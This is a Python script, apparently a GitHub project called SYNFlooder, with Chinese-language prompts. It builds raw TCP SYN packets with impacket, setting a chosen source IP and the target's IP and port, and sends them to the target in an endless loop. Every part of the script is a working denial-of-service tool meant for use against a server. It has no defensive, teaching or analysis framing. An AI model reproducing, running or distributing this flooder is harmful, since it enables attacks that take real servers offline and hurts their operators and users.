import time
import socket
import argparse
import sys
import impacket.ImpactPacket
import warnings
from datetime import datetime

warnings.filterwarnings("ignore")

def attack(dip, lip, t, port=80, sport=12228, speed=1000):
    sent = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError as e:
        print("权限警告：需要管理员/sudo权限运行此脚本")
        sys.exit(1)

    ip = impacket.ImpactPacket.IP()
    tcp = impacket.ImpactPacket.TCP()

    ip.set_ip_src(lip)
    ip.set_ip_dst(dip)
    ip.set_ip_ttl(255)

    tcp.set_th_flags(0b00000010)
    tcp.set_th_sport(sport)
    tcp.set_th_dport(port)
    tcp.set_th_ack(0)
    tcp.set_th_seq(22903)
    tcp.set_th_win(20000)

    while True:
        ip.contains(tcp)
        ip.calculate_checksum()
        try:
            sock.sendto(ip.get_packet(), (dip, port))
            sent += 1
            print(f"已发送 {sent} 个SYN数据包到 {dip} 端口 {port}")
            time.sleep((1000 - speed) / 2000)
        except KeyboardInterrupt:
            print("攻击已停止")
            break
        except Exception as e:
            print(f"发送数据包时出错: {e}")
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN Flooder (http://github.com/Gr3yPh/SYNFlooder) by GR3YPH_4NTOM")
    parser.add_argument("-ip", required=True, help="目标服务器的 IP 地址 (必填)")
    parser.add_argument("-lip", required=True, help="本机的 IP 地址 (必填)")
    parser.add_argument("-port", type=int, default=80, help="目标服务器的端口，默认为 80")
    parser.add_argument("-sport", type=int, default=12228, help="发送数据包的源端口，默认为 12228")
    parser.add_argument("-speed", type=int, default=1000, help="数据包发送速度，范围 1-1000，默认为 1000")

    args = parser.parse_args()

    if not args.ip or not args.lip:
        parser.print_help()
        sys.exit(1)

    print(f"攻击目标: IP = {args.ip}, Port = {args.port}, Speed = {args.speed}")
    attack(args.ip, args.lip, args.speed, args.port, args.sport, args.speed)
